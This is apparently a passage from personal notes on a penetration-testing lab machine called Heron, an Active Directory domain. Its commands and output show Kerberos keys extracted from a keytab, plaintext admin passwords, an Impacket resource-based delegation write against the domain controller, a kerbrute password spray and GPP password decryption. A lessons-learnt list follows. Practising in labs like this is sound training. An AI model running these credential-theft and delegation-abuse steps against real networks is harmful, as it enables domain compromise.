   2 RestrictedKrbHost/FRAJMP@HERON.VL
   2 RestrictedKrbHost/FRAJMP@HERON.VL
   2 RestrictedKrbHost/frajmp.heron.vl@HERON.VL
   2 RestrictedKrbHost/frajmp.heron.vl@HERON.VL
   2 RestrictedKrbHost/frajmp.heron.vl@HERON.VL

```


time to extract it!!

```
kali@kali 2025-11-22 18:07:15 ~> python kt.py krb5.keytab 

FRAJMP$@HERON.VL
    RC4_HMAC: 6f55b3b443ef192c804b2ae98e8254f7
    AES128_CTS_HMAC_SHA1_96: dcaaea0cdc4475eee9bf78e6a6cbd0cd
    AES256_CTS_HMAC_SHA1_96: 7be44e62e24ba5f4a5024c185ade0cd3056b600bb9c69f11da3050dd586130e7

RestrictedKrbHost/FRAJMP@HERON.VL
    RC4_HMAC: 6f55b3b443ef192c804b2ae98e8254f7
    AES128_CTS_HMAC_SHA1_96: dcaaea0cdc4475eee9bf78e6a6cbd0cd
    AES256_CTS_HMAC_SHA1_96: 7be44e62e24ba5f4a5024c185ade0cd3056b600bb9c69f11da3050dd586130e7

RestrictedKrbHost/frajmp.heron.vl@HERON.VL
    RC4_HMAC: 6f55b3b443ef192c804b2ae98e8254f7
    AES128_CTS_HMAC_SHA1_96: dcaaea0cdc4475eee9bf78e6a6cbd0cd
    AES256_CTS_HMAC_SHA1_96: 7be44e62e24ba5f4a5024c185ade0cd3056b600bb9c69f11da3050dd586130e7

host/FRAJMP@HERON.VL
    RC4_HMAC: 6f55b3b443ef192c804b2ae98e8254f7
    AES128_CTS_HMAC_SHA1_96: dcaaea0cdc4475eee9bf78e6a6cbd0cd
    AES256_CTS_HMAC_SHA1_96: 7be44e62e24ba5f4a5024c185ade0cd3056b600bb9c69f11da3050dd586130e7

host/frajmp.heron.vl@HERON.VL
    RC4_HMAC: 6f55b3b443ef192c804b2ae98e8254f7
    AES128_CTS_HMAC_SHA1_96: dcaaea0cdc4475eee9bf78e6a6cbd0cd
    AES256_CTS_HMAC_SHA1_96: 7be44e62e24ba5f4a5024c185ade0cd3056b600bb9c69f11da3050dd586130e7
```





![[Heron-20251122212809369.webp]]



Now we have the adm_prju password

```
"C:\Program Files\PuTTY\putty.exe" adm_prju@mucjmp -pw ayDMWV929N9wAiB4
```


Now that we know we have write account resitrction lets write the SID

```
kali@kali 2025-11-22 18:51:17 ~> rbcd.py -delegate-from 'adm_prju' -delegate-to 'mucdc$' -dc-ip 10.10.191.53 -action 'write' 'heron.vl/adm_prju:ayDMWV929N9wAiB4'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] adm_prju can now impersonate users on mucdc$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     adm_prju     (S-1-5-21-1568358163-2901064146-3316491674-24596)
```



---


# Lessons learnt in total

- Read the config file custom applications, dont rush, investigate and understand how the config file runs
	-  this helps in not being destructive
	- to be specific, the processpath and the arguments needed to be modified of the `web.config`
- Missing the vhost
	- You didn't naturally think to try accounting.heron.vl from the share name accounting$. Lesson: Share names often hint at vhosts/subdomains
- **Context clues matter**: Share names, directory structures, domain names all give hints
- **Assumption about testing** 
	- I thought testing SSH meant you'd tested all local accounts, but `su` is different from SSH access. **Lesson**: Authentication methods are separate - SSH access ≠ local account access
- Tool reliability
	- The biggest issue: `gpp-decrypt` gave you wrong output! **Lesson**: Always verify decrypted passwords, try multiple tools, or decrypt manually if something seems off
- just because ai says soemthing dont take it as true immediately dont be a retard, i thought the sysvol share was vulnerable to a logon script and i forgot its only readbale so wtf am i gonna do
- the ` _local` slipping my mind, There could have been multiple ways that this mistake could have NOT happened. I read it in the xml and didn't think about it
	- If i really wanted to password spray from the GPP then i would have enumerated the `/etc/password/` from the linux file and password sprays rather than relying on the domain users since i KNOW hes a local admin
	- paid attention to the home directory i landed in and if I had payed attention i would have known that the password is for THAT user
- Creating a position map
	- samuel.davies: ASREProastable, can read SYSVOL
	- GPP password: works for svc-web-accounting-d
	- svc-web-accounting-d: writes to accounting$, got shell
	- `_local`: sudo on Linux
	- julian.pratt: ??? (you found this late)
	- adm_prju: has RBCD rights




# Good deeds

- Did some pretty good brute forcing!
	- systematic password spraying AND user enumeration.
- Poked around in the URL files did thorough enumeration
- 


```
kali@kali 2025-11-21 17:28:02 ~> cat users.txt              
_admin                                                                                                                
Guest
krbtgt                              
Katherine.Howard                         
Rachael.Boyle
Anthony.Goodwin                                                                                                       
Carol.John                              
Rosie.Evans
Adam.Harper
Adam.Matthews
Steven.Thomas
Amanda.Williams
Vanessa.Anderson
Jane.Richards
Rhys.George
Mohammed.Parry
Julian.Pratt
Wayne.Wood
Danielle.Harrison
Samuel.Davies
Alice.Hill
Jayne.Johnson
Geraldine.Powell
adm_hoka
adm_prju
svc-web-accounting
svc-web-accounting-d
kali@kali 2025-11-21 17:28:49 ~/k/dist> ./kerbrute_linux_386 passwordspray --dc mucdc.heron.vl -d heron.vl /home/kali/users.txt Hrn04 --safe

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                         

Version: dev (9cfb81e) - 11/21/25 - Ronnie Flathers @ropnop 

2025/11/21 17:28:52 >  Using KDC(s):
2025/11/21 17:28:52 >   mucdc.heron.vl:88

2025/11/21 17:28:52 >  [!] krbtgt@heron.vl:Hrn04 - USER LOCKED OUT and safe mode on! Aborting...
2025/11/21 17:28:52 >  [!] Guest@heron.vl:Hrn04 - USER LOCKED OUT and safe mode on! Aborting...
2025/11/21 17:28:52 >  Done! Tested 21 logins (0 successes) in 0.489 seconds

```



# Mistakes


1. I could have used gpp_password module from nxc to make my life much easier



```
kali@kali 2025-11-21 17:35:23 ~> nxc ssh 10.10.216.102 -u _local -p 'Hrn04' 
SSH         10.10.216.102   22     10.10.216.102    [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.7
SSH         10.10.216.102   22     10.10.216.102    [-] _local:Hrn04
```

I got distracted by this and the enumerated users file, I should have payed attention to the initiatl users on the host

```

pentest@frajmp:/home$ ls
_local  pentest  svc-web-accounting-d@heron.vl  svc-web-accounting@heron.vl

```

still i could have gone to the /etc/hosts 



----


bro FUYCK GPP-DECRYPT FUCK THAT SHIT BRO GAVE ME A WRONG FUCKING PASSWORD

```
kali@kali 2025-11-21 17:11:56 ~/tools> gpp-decrypt 1G19pP9gbIPUr5xLeKhEUg==
Hrn04
```
